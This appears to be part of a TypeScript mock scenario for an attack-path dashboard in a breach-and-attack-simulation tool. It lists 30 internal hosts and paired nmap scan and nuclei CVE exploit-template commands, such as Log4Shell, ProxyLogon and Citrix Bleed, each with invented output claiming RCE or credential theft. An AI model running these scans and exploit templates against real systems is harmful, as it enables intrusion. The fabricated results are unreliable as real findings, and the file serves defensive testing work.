    { node_id:'n4-ep06', node_type:'ASSET', node_label:'PROD-APP-01', node_hostname:'PROD-APP-01', node_ip:'10.50.1.10', node_platform:'Windows Server 2019', node_status:'undetected', node_zone:'App', node_subnet:'10.50.1.0/24', node_agents:['sentinel_one', 'openaev'], },
    { node_id:'n4-ep07', node_type:'ASSET', node_label:'PROD-APP-02', node_hostname:'PROD-APP-02', node_ip:'10.50.1.11', node_platform:'Windows Server 2022', node_status:'undetected', node_zone:'App', node_subnet:'10.50.1.0/24', node_agents:['sentinel_one'], },
    { node_id:'n4-ep08', node_type:'ASSET', node_label:'PROD-APP-03', node_hostname:'PROD-APP-03', node_ip:'10.50.1.12', node_platform:'Ubuntu 22.04 LTS', node_status:'undetected', node_zone:'App', node_subnet:'10.50.1.0/24', node_agents:['sentinel_one', 'openaev'], },
    { node_id:'n4-ep09', node_type:'ASSET', node_label:'PROD-APP-04', node_hostname:'PROD-APP-04', node_ip:'10.50.1.13', node_platform:'Ubuntu 20.04 LTS', node_status:'undetected', node_zone:'App', node_subnet:'10.50.1.0/24', node_agents:['openaev'], },
    { node_id:'n4-ep10', node_type:'ASSET', node_label:'STG-APP-01', node_hostname:'STG-APP-01', node_ip:'10.50.1.20', node_platform:'Windows Server 2019', node_status:'undetected', node_zone:'Staging', node_subnet:'10.50.1.0/24', node_agents:['sentinel_one'], },
    { node_id:'n4-ep11', node_type:'ASSET', node_label:'PROD-DB-01', node_hostname:'PROD-DB-01', node_ip:'10.50.2.10', node_platform:'Windows Server 2022', node_status:'undetected', node_zone:'DB', node_subnet:'10.50.2.0/24', node_agents:['sentinel_one', 'openaev'], },
    { node_id:'n4-ep12', node_type:'ASSET', node_label:'PROD-DB-02', node_hostname:'PROD-DB-02', node_ip:'10.50.2.11', node_platform:'Windows Server 2019', node_status:'undetected', node_zone:'DB', node_subnet:'10.50.2.0/24', node_agents:['palo_alto'], },
    { node_id:'n4-ep13', node_type:'ASSET', node_label:'PROD-DB-03', node_hostname:'PROD-DB-03', node_ip:'10.50.2.12', node_platform:'CentOS 7', node_status:'undetected', node_zone:'DB', node_subnet:'10.50.2.0/24', node_agents:['sentinel_one', 'openaev'], },
    { node_id:'n4-ep14', node_type:'ASSET', node_label:'PROD-DB-04', node_hostname:'PROD-DB-04', node_ip:'10.50.2.13', node_platform:'Ubuntu 22.04 LTS', node_status:'detected', node_zone:'DB', node_subnet:'10.50.2.0/24', node_agents:['sentinel_one'], },
    { node_id:'n4-ep15', node_type:'ASSET', node_label:'STG-DB-01', node_hostname:'STG-DB-01', node_ip:'10.50.2.20', node_platform:'Windows Server 2019', node_status:'undetected', node_zone:'Staging', node_subnet:'10.50.2.0/24', node_agents:['sentinel_one', 'openaev'], },
    { node_id:'n4-ep16', node_type:'ASSET', node_label:'CORP-DC-01', node_hostname:'CORP-DC-01', node_ip:'10.50.3.5', node_platform:'Windows Server 2022', node_status:'undetected', node_zone:'Core', node_subnet:'10.50.3.0/24', node_agents:['openaev'], },
    { node_id:'n4-ep17', node_type:'ASSET', node_label:'CORP-DC-02', node_hostname:'CORP-DC-02', node_ip:'10.50.3.6', node_platform:'Windows Server 2022', node_status:'undetected', node_zone:'Core', node_subnet:'10.50.3.0/24', node_agents:['sentinel_one'], },
    { node_id:'n4-ep18', node_type:'ASSET', node_label:'CORP-EXCH-01', node_hostname:'CORP-EXCH-01', node_ip:'10.50.3.10', node_platform:'Windows Server 2019', node_status:'undetected', node_zone:'Core', node_subnet:'10.50.3.0/24', node_agents:['sentinel_one'], },
    { node_id:'n4-ep19', node_type:'ASSET', node_label:'CORP-DNS-01', node_hostname:'CORP-DNS-01', node_ip:'10.50.3.20', node_platform:'Windows Server 2019', node_status:'undetected', node_zone:'Core', node_subnet:'10.50.3.0/24', node_agents:['openaev'], },
    { node_id:'n4-ep20', node_type:'ASSET', node_label:'CORP-NTP-01', node_hostname:'CORP-NTP-01', node_ip:'10.50.3.25', node_platform:'Ubuntu 22.04 LTS', node_status:'undetected', node_zone:'Core', node_subnet:'10.50.3.0/24', node_agents:['sentinel_one', 'openaev'], },
    { node_id:'n4-ep21', node_type:'ASSET', node_label:'JENKINS-01', node_hostname:'JENKINS-01', node_ip:'10.50.4.10', node_platform:'Ubuntu 22.04 LTS', node_status:'undetected', node_zone:'DevOps', node_subnet:'10.50.4.0/24', node_agents:['sentinel_one'], },
    { node_id:'n4-ep22', node_type:'ASSET', node_label:'GITLAB-01', node_hostname:'GITLAB-01', node_ip:'10.50.4.11', node_platform:'Ubuntu 22.04 LTS', node_status:'undetected', node_zone:'DevOps', node_subnet:'10.50.4.0/24', node_agents:['openaev'], },
    { node_id:'n4-ep23', node_type:'ASSET', node_label:'NEXUS-01', node_hostname:'NEXUS-01', node_ip:'10.50.4.12', node_platform:'Ubuntu 20.04 LTS', node_status:'undetected', node_zone:'DevOps', node_subnet:'10.50.4.0/24', node_agents:['palo_alto'], },
    { node_id:'n4-ep24', node_type:'ASSET', node_label:'HARBOR-01', node_hostname:'HARBOR-01', node_ip:'10.50.4.13', node_platform:'Ubuntu 22.04 LTS', node_status:'undetected', node_zone:'DevOps', node_subnet:'10.50.4.0/24', node_agents:['openaev'], },
    { node_id:'n4-ep25', node_type:'ASSET', node_label:'VAULT-01', node_hostname:'VAULT-01', node_ip:'10.50.4.20', node_platform:'Ubuntu 22.04 LTS', node_status:'undetected', node_zone:'DevOps', node_subnet:'10.50.4.0/24', node_agents:['sentinel_one'], },
    { node_id:'n4-ep26', node_type:'ASSET', node_label:'CORP-WS-01', node_hostname:'CORP-WS-01', node_ip:'10.50.5.10', node_platform:'Windows 11', node_status:'undetected', node_zone:'Workstations', node_subnet:'10.50.5.0/24', node_agents:['sentinel_one', 'openaev'], },
    { node_id:'n4-ep27', node_type:'ASSET', node_label:'CORP-WS-02', node_hostname:'CORP-WS-02', node_ip:'10.50.5.11', node_platform:'Windows 11', node_status:'undetected', node_zone:'Workstations', node_subnet:'10.50.5.0/24', node_agents:['sentinel_one', 'openaev'], },
    { node_id:'n4-ep28', node_type:'ASSET', node_label:'CORP-WS-03', node_hostname:'CORP-WS-03', node_ip:'10.50.5.12', node_platform:'Windows 10', node_status:'undetected', node_zone:'Workstations', node_subnet:'10.50.5.0/24', node_agents:['sentinel_one', 'openaev'], },
    { node_id:'n4-ep29', node_type:'ASSET', node_label:'CORP-WS-04', node_hostname:'CORP-WS-04', node_ip:'10.50.5.13', node_platform:'Windows 11', node_status:'undetected', node_zone:'Workstations', node_subnet:'10.50.5.0/24', node_agents:['sentinel_one'], },
    { node_id:'n4-ep30', node_type:'ASSET', node_label:'CORP-WS-05', node_hostname:'CORP-WS-05', node_ip:'10.50.5.14', node_platform:'macOS Sonoma 14.4', node_status:'undetected', node_zone:'Workstations', node_subnet:'10.50.5.0/24', node_agents:['openaev'], },
    { node_id:'n4-act01', node_type:'ACTION', node_label:'nmap – TCP SYN Scan — 10.50.0.10',
      node_status:'undetected', node_payload_name:'nmap – TCP SYN Scan',
      node_command:'nmap', node_arguments:'-sS -sV -p 80,443,8080,8443 10.50.0.10',
      node_executed_at:'2026-06-12T06:12:00Z', node_agent:'openaev', node_ip:'10.50.0.10',
      node_expectations:[{expectation_id:'n4-e01',expectation_type:'DETECTION',expectation_status:'FAILED',expectation_score:0,expectation_expected_score:100}],
      node_terminal_output:`Nmap: 80/tcp nginx 1.24, 443/tcp ssl, 8080/tcp Apache/Tomcat open` },
    { node_id:'n4-act02', node_type:'ACTION', node_label:'nuclei – CVE-2021-22205 — 10.50.0.11',
      node_status:'undetected', node_payload_name:'nuclei – CVE-2021-22205',
      node_command:'nuclei', node_arguments:'-u http://HOST:8080 -t cves/2021/CVE-2021-22205.yaml 10.50.0.11',
      node_executed_at:'2026-06-12T06:24:00Z', node_agent:'sentinel_one', node_ip:'10.50.0.11',
      node_expectations:[{expectation_id:'n4-e02',expectation_type:'DETECTION',expectation_status:'FAILED',expectation_score:0,expectation_expected_score:100}],
      node_terminal_output:`[CVE-2021-22205] [critical] GitLab ExifTool RCE → uid=git, creds extracted` },
    { node_id:'n4-act03', node_type:'ACTION', node_label:'nmap – TCP SYN Scan — 10.50.0.12',
      node_status:'undetected', node_payload_name:'nmap – TCP SYN Scan',
      node_command:'nmap', node_arguments:'-sS -p 22,80,443,8080 10.50.0.12',
      node_executed_at:'2026-06-12T06:36:00Z', node_agent:'openaev', node_ip:'10.50.0.12',
      node_expectations:[{expectation_id:'n4-e03',expectation_type:'DETECTION',expectation_status:'FAILED',expectation_score:0,expectation_expected_score:100}],
      node_terminal_output:`Nmap: 22/tcp ssh OpenSSH 8.9p1, 80/tcp http nginx, 443/tcp ssl` },
    { node_id:'n4-act04', node_type:'ACTION', node_label:'nuclei – CVE-2021-44228 — 10.50.0.20',
      node_status:'undetected', node_payload_name:'nuclei – CVE-2021-44228',
      node_command:'nuclei', node_arguments:'-t cves/2021/CVE-2021-44228.yaml 10.50.0.20',
      node_executed_at:'2026-06-12T06:48:00Z', node_agent:'sentinel_one', node_ip:'10.50.0.20',
      node_expectations:[{expectation_id:'n4-e04',expectation_type:'DETECTION',expectation_status:'FAILED',expectation_score:0,expectation_expected_score:100}],
      node_terminal_output:`[CVE-2021-44228] [critical] Log4Shell → JNDI LDAP callback confirmed, RCE established` },
    { node_id:'n4-act05', node_type:'ACTION', node_label:'nmap – TCP SYN Scan — 10.50.0.21',
      node_status:'detected', node_payload_name:'nmap – TCP SYN Scan',
      node_command:'nmap', node_arguments:'-sS -sV -p 80,443,3000,8080 10.50.0.21',
      node_executed_at:'2026-06-12T07:00:00Z', node_agent:'openaev', node_ip:'10.50.0.21',
      node_expectations:[{expectation_id:'n4-e05',expectation_type:'DETECTION',expectation_status:'SUCCEEDED',expectation_score:100,expectation_expected_score:100}],
      node_terminal_output:`Nmap DETECTION: PortScan alert on STG-WEB-02. 80/tcp, 443/tcp, 3000/tcp Node.js` },
    { node_id:'n4-act06', node_type:'ACTION', node_label:'nuclei – CVE-2022-22965 — 10.50.1.10',
      node_status:'undetected', node_payload_name:'nuclei – CVE-2022-22965',
      node_command:'nuclei', node_arguments:'-t cves/2022/CVE-2022-22965.yaml 10.50.1.10',
      node_executed_at:'2026-06-12T07:12:00Z', node_agent:'sentinel_one', node_ip:'10.50.1.10',
      node_expectations:[{expectation_id:'n4-e06',expectation_type:'DETECTION',expectation_status:'FAILED',expectation_score:0,expectation_expected_score:100}],
      node_terminal_output:`[CVE-2022-22965] [critical] Spring4Shell → /cmd.jsp web shell deployed uid=tomcat` },
    { node_id:'n4-act07', node_type:'ACTION', node_label:'nmap – TCP SYN Scan — 10.50.1.11',
      node_status:'undetected', node_payload_name:'nmap – TCP SYN Scan',
      node_command:'nmap', node_arguments:'-sS -p 80,443,8080,8443 --script=http-methods 10.50.1.11',
      node_executed_at:'2026-06-12T07:24:00Z', node_agent:'openaev', node_ip:'10.50.1.11',
      node_expectations:[{expectation_id:'n4-e07',expectation_type:'DETECTION',expectation_status:'FAILED',expectation_score:0,expectation_expected_score:100}],
      node_terminal_output:`Nmap: 80/tcp http IIS 10.0, 443/tcp ssl, 8080/tcp Tomcat 10.0, HTTP methods discovered` },
    { node_id:'n4-act08', node_type:'ACTION', node_label:'nuclei – CVE-2022-26134 — 10.50.1.12',
      node_status:'undetected', node_payload_name:'nuclei – CVE-2022-26134',
      node_command:'nuclei', node_arguments:'-t cves/2022/CVE-2022-26134.yaml 10.50.1.12',
      node_executed_at:'2026-06-12T07:36:00Z', node_agent:'sentinel_one', node_ip:'10.50.1.12',
      node_expectations:[{expectation_id:'n4-e08',expectation_type:'DETECTION',expectation_status:'FAILED',expectation_score:0,expectation_expected_score:100}],
      node_terminal_output:`[CVE-2022-26134] [critical] Confluence OGNL injection → RCE, admin creds extracted` },
    { node_id:'n4-act09', node_type:'ACTION', node_label:'nmap – TCP SYN Scan — 10.50.1.13',
      node_status:'undetected', node_payload_name:'nmap – TCP SYN Scan',
      node_command:'nmap', node_arguments:'-sS -sV -p 22,8080,8443 -T4 10.50.1.13',
      node_executed_at:'2026-06-12T07:48:00Z', node_agent:'openaev', node_ip:'10.50.1.13',
      node_expectations:[{expectation_id:'n4-e09',expectation_type:'DETECTION',expectation_status:'FAILED',expectation_score:0,expectation_expected_score:100}],
      node_terminal_output:`Nmap: 22/tcp ssh, 8080/tcp Tomcat 9.0, 8443/tcp ssl. All open on PROD-APP-03` },
    { node_id:'n4-act10', node_type:'ACTION', node_label:'nuclei – CVE-2021-26084 — 10.50.1.20',
      node_status:'undetected', node_payload_name:'nuclei – CVE-2021-26084',
      node_command:'nuclei', node_arguments:'-t cves/2021/CVE-2021-26084.yaml 10.50.1.20',
      node_executed_at:'2026-06-12T08:00:00Z', node_agent:'sentinel_one', node_ip:'10.50.1.20',
      node_expectations:[{expectation_id:'n4-e10',expectation_type:'DETECTION',expectation_status:'FAILED',expectation_score:0,expectation_expected_score:100}],
      node_terminal_output:`[CVE-2021-26084] [critical] Confluence Server RCE → SYSTEM, shared secret extracted` },
    { node_id:'n4-act11', node_type:'ACTION', node_label:'nmap – TCP SYN Scan — 10.50.2.10',
      node_status:'undetected', node_payload_name:'nmap – TCP SYN Scan',
      node_command:'nmap', node_arguments:'-sS -p 1433,3306,5432,27017 10.50.2.10',
      node_executed_at:'2026-06-12T08:12:00Z', node_agent:'openaev', node_ip:'10.50.2.10',
      node_expectations:[{expectation_id:'n4-e11',expectation_type:'DETECTION',expectation_status:'FAILED',expectation_score:0,expectation_expected_score:100}],
      node_terminal_output:`Nmap: 1433/tcp mssql, 3306/tcp mysql, 5432/tcp postgresql, 27017/tcp mongodb` },
    { node_id:'n4-act12', node_type:'ACTION', node_label:'nuclei – CVE-2021-21972 — 10.50.2.11',
      node_status:'undetected', node_payload_name:'nuclei – CVE-2021-21972',
      node_command:'nuclei', node_arguments:'-t cves/2021/CVE-2021-21972.yaml 10.50.2.11',
      node_executed_at:'2026-06-12T08:24:00Z', node_agent:'sentinel_one', node_ip:'10.50.2.11',
      node_expectations:[{expectation_id:'n4-e12',expectation_type:'DETECTION',expectation_status:'FAILED',expectation_score:0,expectation_expected_score:100}],
      node_terminal_output:`[CVE-2021-21972] [critical] VMware vCenter RCE → VSPHERE.LOCAL admin access` },
    { node_id:'n4-act13', node_type:'ACTION', node_label:'nmap – TCP SYN Scan — 10.50.2.12',
      node_status:'undetected', node_payload_name:'nmap – TCP SYN Scan',
      node_command:'nmap', node_arguments:'-sS -p 1433,5432 -sV 10.50.2.12',
      node_executed_at:'2026-06-12T08:36:00Z', node_agent:'openaev', node_ip:'10.50.2.12',
      node_expectations:[{expectation_id:'n4-e13',expectation_type:'DETECTION',expectation_status:'FAILED',expectation_score:0,expectation_expected_score:100}],
      node_terminal_output:`Nmap: 1433/tcp Microsoft SQL Server 2019, 5432/tcp PostgreSQL 14.5` },
    { node_id:'n4-act14', node_type:'ACTION', node_label:'nuclei – CVE-2022-1388 — 10.50.2.13',
      node_status:'detected', node_payload_name:'nuclei – CVE-2022-1388',
      node_command:'nuclei', node_arguments:'-t cves/2022/CVE-2022-1388.yaml 10.50.2.13',
      node_executed_at:'2026-06-12T08:48:00Z', node_agent:'sentinel_one', node_ip:'10.50.2.13',
      node_expectations:[{expectation_id:'n4-e14',expectation_type:'DETECTION',expectation_status:'SUCCEEDED',expectation_score:100,expectation_expected_score:100}],
      node_terminal_output:`[CVE-2022-1388] DETECTION: F5 BIG-IP auth bypass attempt flagged by WAF rule` },
    { node_id:'n4-act15', node_type:'ACTION', node_label:'nmap – TCP SYN Scan — 10.50.2.20',
      node_status:'undetected', node_payload_name:'nmap – TCP SYN Scan',
      node_command:'nmap', node_arguments:'-sS -p 1433,3306 -T4 10.50.2.20',
      node_executed_at:'2026-06-12T09:00:00Z', node_agent:'openaev', node_ip:'10.50.2.20',
      node_expectations:[{expectation_id:'n4-e15',expectation_type:'DETECTION',expectation_status:'FAILED',expectation_score:0,expectation_expected_score:100}],
      node_terminal_output:`Nmap: 1433/tcp mssql, 3306/tcp mysql 5.7.42. Version banners obtained` },
    { node_id:'n4-act16', node_type:'ACTION', node_label:'nuclei – CVE-2021-26855 — 10.50.3.5',
      node_status:'undetected', node_payload_name:'nuclei – CVE-2021-26855',
      node_command:'nuclei', node_arguments:'-t cves/2021/CVE-2021-26855.yaml 10.50.3.5',
      node_executed_at:'2026-06-12T09:12:00Z', node_agent:'sentinel_one', node_ip:'10.50.3.5',
      node_expectations:[{expectation_id:'n4-e16',expectation_type:'DETECTION',expectation_status:'FAILED',expectation_score:0,expectation_expected_score:100}],
      node_terminal_output:`[CVE-2021-26855] [critical] Exchange ProxyLogon → SYSTEM on CORP-DC-01` },
    { node_id:'n4-act17', node_type:'ACTION', node_label:'nmap – TCP SYN Scan — 10.50.3.6',
      node_status:'undetected', node_payload_name:'nmap – TCP SYN Scan',
      node_command:'nmap', node_arguments:'-sS -p 88,389,445,3268,3269 10.50.3.6',
      node_executed_at:'2026-06-12T09:24:00Z', node_agent:'openaev', node_ip:'10.50.3.6',
      node_expectations:[{expectation_id:'n4-e17',expectation_type:'DETECTION',expectation_status:'FAILED',expectation_score:0,expectation_expected_score:100}],
      node_terminal_output:`Nmap: 88/tcp kerberos, 389/tcp ldap, 445/tcp smb, 3268/tcp globalcatalog. All open` },
    { node_id:'n4-act18', node_type:'ACTION', node_label:'nuclei – CVE-2023-23397 — 10.50.3.10',
      node_status:'undetected', node_payload_name:'nuclei – CVE-2023-23397',
      node_command:'nuclei', node_arguments:'-t cves/2023/CVE-2023-23397.yaml 10.50.3.10',
      node_executed_at:'2026-06-12T09:36:00Z', node_agent:'sentinel_one', node_ip:'10.50.3.10',
      node_expectations:[{expectation_id:'n4-e18',expectation_type:'DETECTION',expectation_status:'FAILED',expectation_score:0,expectation_expected_score:100}],
      node_terminal_output:`[CVE-2023-23397] [critical] Outlook NTLM theft → CORP NTLMv2 hash captured offline` },
    { node_id:'n4-act19', node_type:'ACTION', node_label:'nmap – TCP SYN Scan — 10.50.3.20',
      node_status:'undetected', node_payload_name:'nmap – TCP SYN Scan',
      node_command:'nmap', node_arguments:'-sS -p 53,80,443 -sV 10.50.3.20',
      node_executed_at:'2026-06-12T09:48:00Z', node_agent:'openaev', node_ip:'10.50.3.20',
      node_expectations:[{expectation_id:'n4-e19',expectation_type:'DETECTION',expectation_status:'FAILED',expectation_score:0,expectation_expected_score:100}],
      node_terminal_output:`Nmap: 53/tcp domain, 80/tcp http, 443/tcp ssl. DNS service info retrieved` },
    { node_id:'n4-act20', node_type:'ACTION', node_label:'nuclei – CVE-2023-4966 — 10.50.3.25',
      node_status:'undetected', node_payload_name:'nuclei – CVE-2023-4966',
      node_command:'nuclei', node_arguments:'-t cves/2023/CVE-2023-4966.yaml 10.50.3.25',
      node_executed_at:'2026-06-12T10:00:00Z', node_agent:'sentinel_one', node_ip:'10.50.3.25',
      node_expectations:[{expectation_id:'n4-e20',expectation_type:'DETECTION',expectation_status:'FAILED',expectation_score:0,expectation_expected_score:100}],
      node_terminal_output:`[CVE-2023-4966] [critical] Citrix Bleed session token leak → admin session hijacked` },
    { node_id:'n4-act21', node_type:'ACTION', node_label:'nuclei – CVE-2024-4577 — 10.50.4.10',
      node_status:'undetected', node_payload_name:'nuclei – CVE-2024-4577',
      node_command:'nuclei', node_arguments:'-t cves/2024/CVE-2024-4577.yaml 10.50.4.10',
      node_executed_at:'2026-06-12T10:12:00Z', node_agent:'sentinel_one', node_ip:'10.50.4.10',
      node_expectations:[{expectation_id:'n4-e21',expectation_type:'DETECTION',expectation_status:'FAILED',expectation_score:0,expectation_expected_score:100}],
      node_terminal_output:`[CVE-2024-4577] [critical] PHP-CGI arg injection on JENKINS-01 → RCE, pipelines exposed` },
    { node_id:'n4-act22', node_type:'ACTION', node_label:'nuclei – CVE-2021-22205 — 10.50.4.11',
      node_status:'undetected', node_payload_name:'nuclei – CVE-2021-22205',
      node_command:'nuclei', node_arguments:'-u http://HOST:80 -t cves/2021/CVE-2021-22205.yaml 10.50.4.11',
      node_executed_at:'2026-06-12T10:24:00Z', node_agent:'sentinel_one', node_ip:'10.50.4.11',
      node_expectations:[{expectation_id:'n4-e22',expectation_type:'DETECTION',expectation_status:'FAILED',expectation_score:0,expectation_expected_score:100}],
      node_terminal_output:`[CVE-2021-22205] [critical] GitLab RCE on GITLAB-01 → source code repos cloned` },
    { node_id:'n4-act23', node_type:'ACTION', node_label:'nmap – TCP SYN Scan — 10.50.4.12',
      node_status:'undetected', node_payload_name:'nmap – TCP SYN Scan',
      node_command:'nmap', node_arguments:'-sS -p 8081,8443,5000 -sV 10.50.4.12',
      node_executed_at:'2026-06-12T10:36:00Z', node_agent:'openaev', node_ip:'10.50.4.12',
      node_expectations:[{expectation_id:'n4-e23',expectation_type:'DETECTION',expectation_status:'FAILED',expectation_score:0,expectation_expected_score:100}],
      node_terminal_output:`Nmap: 8081/tcp nexus, 8443/tcp ssl nexus, 5000/tcp docker-registry. All open` },
    { node_id:'n4-act24', node_type:'ACTION', node_label:'nuclei – CVE-2023-44487 — 10.50.4.13',
      node_status:'undetected', node_payload_name:'nuclei – CVE-2023-44487',
      node_command:'nuclei', node_arguments:'-t cves/2023/CVE-2023-44487.yaml 10.50.4.13',
      node_executed_at:'2026-06-12T10:48:00Z', node_agent:'sentinel_one', node_ip:'10.50.4.13',
      node_expectations:[{expectation_id:'n4-e24',expectation_type:'DETECTION',expectation_status:'FAILED',expectation_score:0,expectation_expected_score:100}],
      node_terminal_output:`[CVE-2023-44487] [critical] HTTP/2 Rapid Reset → Harbor registry DoS + file read` },
    { node_id:'n4-act25', node_type:'ACTION', node_label:'nuclei – HashiCorp Vault Audit — 10.50.4.20',
      node_status:'undetected', node_payload_name:'nuclei – HashiCorp Vault Audit',
      node_command:'nuclei', node_arguments:'-t misconfigurations/hashicorp-vault.yaml 10.50.4.20',
      node_executed_at:'2026-06-12T11:00:00Z', node_agent:'sentinel_one', node_ip:'10.50.4.20',
      node_expectations:[{expectation_id:'n4-e25',expectation_type:'DETECTION',expectation_status:'FAILED',expectation_score:0,expectation_expected_score:100}],
      node_terminal_output:`HashiCorp Vault: /v1/sys/health unauthenticated. Root token in /proc/environ exposed` },
    { node_id:'n4-act26', node_type:'ACTION', node_label:'nmap – TCP SYN Scan — 10.50.5.10',
      node_status:'undetected', node_payload_name:'nmap – TCP SYN Scan',
      node_command:'nmap', node_arguments:'-sS -p 135,445,3389,5985 -T4 10.50.5.10',
      node_executed_at:'2026-06-12T11:12:00Z', node_agent:'openaev', node_ip:'10.50.5.10',
      node_expectations:[{expectation_id:'n4-e26',expectation_type:'DETECTION',expectation_status:'FAILED',expectation_score:0,expectation_expected_score:100}],
      node_terminal_output:`Nmap: 135/tcp msrpc, 445/tcp smb, 3389/tcp rdp, 5985/tcp winrm. All open` },
    { node_id:'n4-act27', node_type:'ACTION', node_label:'nuclei – CVE-2021-44228 — 10.50.5.11',
      node_status:'undetected', node_payload_name:'nuclei – CVE-2021-44228',
      node_command:'nuclei', node_arguments:'-t cves/2021/CVE-2021-44228.yaml 10.50.5.11',
      node_executed_at:'2026-06-12T11:24:00Z', node_agent:'sentinel_one', node_ip:'10.50.5.11',
      node_expectations:[{expectation_id:'n4-e27',expectation_type:'DETECTION',expectation_status:'FAILED',expectation_score:0,expectation_expected_score:100}],
      node_terminal_output:`[CVE-2021-44228] Log4Shell on CORP-WS-02 → user-space RCE via Log4j2 logging` },
    { node_id:'n4-act28', node_type:'ACTION', node_label:'nmap – TCP SYN Scan — 10.50.5.12',
      node_status:'detected', node_payload_name:'nmap – TCP SYN Scan',
      node_command:'nmap', node_arguments:'-sS -p 135,445 --script smb-vuln-ms17-010 10.50.5.12',
      node_executed_at:'2026-06-12T11:36:00Z', node_agent:'openaev', node_ip:'10.50.5.12',
      node_expectations:[{expectation_id:'n4-e28',expectation_type:'DETECTION',expectation_status:'SUCCEEDED',expectation_score:100,expectation_expected_score:100}],
      node_terminal_output:`Nmap DETECTION: smb-vuln-ms17-010 — VULNERABLE. EternalBlue applicable on CORP-WS-03` },
    { node_id:'n4-act29', node_type:'ACTION', node_label:'nuclei – CVE-2023-23397 — 10.50.5.13',
      node_status:'undetected', node_payload_name:'nuclei – CVE-2023-23397',
      node_command:'nuclei', node_arguments:'-t cves/2023/CVE-2023-23397.yaml 10.50.5.13',
      node_executed_at:'2026-06-12T11:48:00Z', node_agent:'sentinel_one', node_ip:'10.50.5.13',
      node_expectations:[{expectation_id:'n4-e29',expectation_type:'DETECTION',expectation_status:'FAILED',expectation_score:0,expectation_expected_score:100}],
      node_terminal_output:`[CVE-2023-23397] [critical] Outlook exploit → NTLM relay to CORP-WS-04 foothold` },
    { node_id:'n4-act30', node_type:'ACTION', node_label:'nmap – TCP SYN Scan — 10.50.5.14',
      node_status:'undetected', node_payload_name:'nmap – TCP SYN Scan',
      node_command:'nmap', node_arguments:'-sS -p 22,3389,5900 -sV -T4 10.50.5.14',
      node_executed_at:'2026-06-12T12:00:00Z', node_agent:'openaev', node_ip:'10.50.5.14',
      node_expectations:[{expectation_id:'n4-e30',expectation_type:'DETECTION',expectation_status:'FAILED',expectation_score:0,expectation_expected_score:100}],
      node_terminal_output:`Nmap: 22/tcp ssh OpenSSH, 3389/tcp ms-wbt-server, 5900/tcp vnc. Open on macOS host` },
  ],
  attack_path_edges: [
    { edge_id:'n4-al-01', edge_type:'asset_link', edge_source:'n4-act01', edge_target:'n4-ep01' },
    { edge_id:'n4-al-02', edge_type:'asset_link', edge_source:'n4-act02', edge_target:'n4-ep02' },
    { edge_id:'n4-al-03', edge_type:'asset_link', edge_source:'n4-act03', edge_target:'n4-ep03' },
    { edge_id:'n4-al-04', edge_type:'asset_link', edge_source:'n4-act04', edge_target:'n4-ep04' },
    { edge_id:'n4-al-05', edge_type:'asset_link', edge_source:'n4-act05', edge_target:'n4-ep05' },
    { edge_id:'n4-al-06', edge_type:'asset_link', edge_source:'n4-act06', edge_target:'n4-ep06' },
    { edge_id:'n4-al-07', edge_type:'asset_link', edge_source:'n4-act07', edge_target:'n4-ep07' },
    { edge_id:'n4-al-08', edge_type:'asset_link', edge_source:'n4-act08', edge_target:'n4-ep08' },
    { edge_id:'n4-al-09', edge_type:'asset_link', edge_source:'n4-act09', edge_target:'n4-ep09' },
    { edge_id:'n4-al-10', edge_type:'asset_link', edge_source:'n4-act10', edge_target:'n4-ep10' },
    { edge_id:'n4-al-11', edge_type:'asset_link', edge_source:'n4-act11', edge_target:'n4-ep11' },
    { edge_id:'n4-al-12', edge_type:'asset_link', edge_source:'n4-act12', edge_target:'n4-ep12' },
    { edge_id:'n4-al-13', edge_type:'asset_link', edge_source:'n4-act13', edge_target:'n4-ep13' },
    { edge_id:'n4-al-14', edge_type:'asset_link', edge_source:'n4-act14', edge_target:'n4-ep14' },
    { edge_id:'n4-al-15', edge_type:'asset_link', edge_source:'n4-act15', edge_target:'n4-ep15' },
    { edge_id:'n4-al-16', edge_type:'asset_link', edge_source:'n4-act16', edge_target:'n4-ep16' },
    { edge_id:'n4-al-17', edge_type:'asset_link', edge_source:'n4-act17', edge_target:'n4-ep17' },
    { edge_id:'n4-al-18', edge_type:'asset_link', edge_source:'n4-act18', edge_target:'n4-ep18' },
    { edge_id:'n4-al-19', edge_type:'asset_link', edge_source:'n4-act19', edge_target:'n4-ep19' },
    { edge_id:'n4-al-20', edge_type:'asset_link', edge_source:'n4-act20', edge_target:'n4-ep20' },
    { edge_id:'n4-al-21', edge_type:'asset_link', edge_source:'n4-act21', edge_target:'n4-ep21' },
    { edge_id:'n4-al-22', edge_type:'asset_link', edge_source:'n4-act22', edge_target:'n4-ep22' },
    { edge_id:'n4-al-23', edge_type:'asset_link', edge_source:'n4-act23', edge_target:'n4-ep23' },
    { edge_id:'n4-al-24', edge_type:'asset_link', edge_source:'n4-act24', edge_target:'n4-ep24' },
    { edge_id:'n4-al-25', edge_type:'asset_link', edge_source:'n4-act25', edge_target:'n4-ep25' },
    { edge_id:'n4-al-26', edge_type:'asset_link', edge_source:'n4-act26', edge_target:'n4-ep26' },
    { edge_id:'n4-al-27', edge_type:'asset_link', edge_source:'n4-act27', edge_target:'n4-ep27' },
    { edge_id:'n4-al-28', edge_type:'asset_link', edge_source:'n4-act28', edge_target:'n4-ep28' },
    { edge_id:'n4-al-29', edge_type:'asset_link', edge_source:'n4-act29', edge_target:'n4-ep29' },
    { edge_id:'n4-al-30', edge_type:'asset_link', edge_source:'n4-act30', edge_target:'n4-ep30' },
  ],
  attack_path_stats: {
    stats_prevented:0, stats_detected:2, stats_undetected:28,
    stats_pending:0, stats_total_actions:30, stats_executed_actions:30,
    stats_captured_endpoints:30, stats_captured_files:18, stats_captured_credentials:24,
 stats_captured_users: 17,
 stats_captured_cves: 11,
  },
  attack_path_definitions: [
    { path_id:'n4-p1', path_name:'Full Vulnerability Sweep', path_color:'#4caf50', node_ids:['n4-ep01','n4-ep02','n4-ep03','n4-ep04','n4-ep05','n4-ep06','n4-ep07','n4-ep08','n4-ep09','n4-ep10','n4-ep11','n4-ep12','n4-ep13','n4-ep14','n4-ep15','n4-ep16','n4-ep17','n4-ep18','n4-ep19','n4-ep20','n4-ep21','n4-ep22','n4-ep23','n4-ep24','n4-ep25','n4-ep26','n4-ep27','n4-ep28','n4-ep29','n4-ep30'], path_outcome:'success' },
  ],
};
export function getMockScenario(): AttackPathData {
  return MOCK_SCENARIO_APT_DOMAIN;
}

// NEW SCENARIO G — Credential Spray Campaign (1 path, repeated actions with different params)
// Same netexec SMB spray action runs 12 times with different user:password combos across 1 attack path.
// 8 active endpoints (used in path), 7 discovered-but-not-attacked (untouched).
// NEW SCENARIO H — Credential Spray (Injectors Only) — same campaign, no EP-to-EP lateral edges
